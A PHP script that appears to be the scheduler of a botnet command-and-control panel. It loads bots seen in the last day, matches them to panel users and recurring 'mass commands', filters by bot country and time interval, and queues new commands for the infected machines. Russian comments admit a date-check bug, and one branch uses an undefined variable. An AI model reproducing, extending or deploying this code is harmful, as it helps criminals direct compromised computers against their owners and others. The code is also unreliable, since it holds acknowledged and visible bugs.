<?php
	include "config.php";
	
	$usersid = array();
	$sql = "select id from users";
	$res = $dbm->query($sql);
	if($dbm->count>0){
		while($row=mysqli_fetch_array($res)) {
			$usersid[] = $row[0];
		}	
	}
	
	//var_dump($usersid);
	
	$bots = array();
	$bids = array();
	$bcountry = array();
	
	$sql = "select * from bots where bot_last_seen>'".$kernel['time_day']."';";
	$res = $dbm->query($sql);
	while($row=mysqli_fetch_array($res)) {
		$bots[$row[1]] = $row;
		//$bcountry[$row[1]] = $row[15]; 
	}
	
	//var_dump($bots);
	//die();
	
	$commands = array();
	$sqlc = "select * from commands";
	$resc = $dbm->query($sqlc);
	if($dbm->count>0){
		while($rowc=mysqli_fetch_array($resc)) {
			$commands[] = $rowc;
		}
	}	
	
	function check_bot_have_commands($bid,$commands,$idcom){
		foreach($commands as $command){
			if($command[2]==$idcom && $command[1]==$bid)
				return true;
		}
		return false;
	}
	
	function max_date_command($bid,$commands){
		$max = 0;
		foreach($commands as $command){
			if($command[4]>$max && $command[1]==$bid)
				$max = $command[4];
		}
		return $max;
	}
	
	$mass_commands = array();
	$sqlmc = "select * from mass_commands";
	$resmc = $dbm->query($sqlmc);
	while($rowmc=mysqli_fetch_array($resmc)) {
			$mass_commands[] = $rowmc;
	}
		
	function max_id_commands($bid,$commands,$idcom){
		$id = 0;
		foreach($commands as $command){
			if($command[2]==$idcom && $command[1]==$bid)
				if($command[0]>$id)$id = $command[0];
		}
		return $id;
	}
	
	
	foreach($usersid as $userid){
		//$sql = "select * from bots where bot_user_id='".$userid."' and bot_last_seen>'".$kernel['time_day']."';";
		//$res = $dbm->query($sql);
		//while($row=mysqli_fetch_array($res)) {
		//	$bids[] = $row[1];
		//	$bcountry[$row[1]] = $row[15]; 
		//}
		
		//$sqlmc = "select * from mass_commands where userid='".$userid."'";
		//$resmc = $dbm->query($sqlmc);
		//while($rowmc=mysqli_fetch_array($resmc)) {
		//foreach($commands as $command){
		foreach($mass_commands as $mass_command){	
			if($mass_command["userid"]==$userid){
				foreach($bots as $bid=>$bot){
					//$sqlc = "select * from commands where bid='".$bid."' and idcom='".$rowmc[1]."'";
					//$resc = $dbm->query($sqlc);
					//if($dbm->count>0){
					if($bot["bot_user_id"]==$userid)
					if(check_bot_have_commands($bid,$commands,$mass_command[1])){
						$max_bot_id = max_id_commands($bid,$commands,$mass_command[1]);
						//if($bot[$bid]["bot_user_id"]==$userid){
						foreach($commands as $command){
							//var_dump($command[2]);
							if(($command[1]==$bid) && $command[2]==$mass_command[1] && $command[0]==$max_bot_id){
							//var_dump($command[2]);
							//while($rowc=mysqli_fetch_array($resc)) {
								if($command[4]<(time()-(60*$mass_command[5]))){
									if($mass_command[4]==1){
										$params = json_decode($mass_command[7]);
										if($params->country==""){
											generate_command($bid,$mass_command[1],$mass_command[2],0,0);
										}else{
											foreach(explode(",",$params->country) as $country){
												if($country==$bot["country"]){
													generate_command($bid,$mass_command[1],$mass_command[2],0,0);
												}
											}
										}
									}
								}
							}
						}
					}else{
						//if($bot[$bid]["bot_user_id"]==$userid){
							$max_date = max_date_command($bid,$commands);
							//$sqllc = "select max(date_add) from commands where bid='".$bid."'";
							//$reslc = $dbm->query($sqllc);
							//if($dbm->count>0){
							if($max_date>0){
								//while($rowlc=mysqli_fetch_array($reslc)) {
									if($max_date<(time()-(60*$mass_command[5]))){
										$params = json_decode($mass_command[7]);
										if($params->country==""){
											generate_command($bid,$rowmc[1],$mass_command[2],0,0);
										}else{
											foreach(explode(",",$params->country) as $country){
												if($country==$bot["country"]){
													generate_command($bid,$mass_command[1],$mass_command[2],0,0);
												}
											}
										}
									}
								//}						
							}else{
								generate_command($bid,$mass_command[1],$mass_command[2],0,0);
							}
						//}
						//смотрим последгюю команду и время от нее, если команд нету то запрашиваем базовые
					}
				}//// бля где-то баг с проверкой на дату между созданиями команд
				//var_dump($row);
			}
		}
		//var_dump($);
	}
	
	//var_dump($bids);
?>
